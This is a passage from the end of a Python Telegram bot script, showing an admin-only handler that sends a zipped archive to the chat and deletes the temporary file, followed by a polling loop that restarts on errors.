                bot.send_document(message.chat.id, file)
            
            # Delete the temporary zip file after sending
            os.remove(zip_filename)
        else:
            bot.reply_to(message, "❌ Failed to create the archive. No files found.")
    else:
        bot.reply_to(message, "❌ Only the master admin can use this command.")

# Start the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)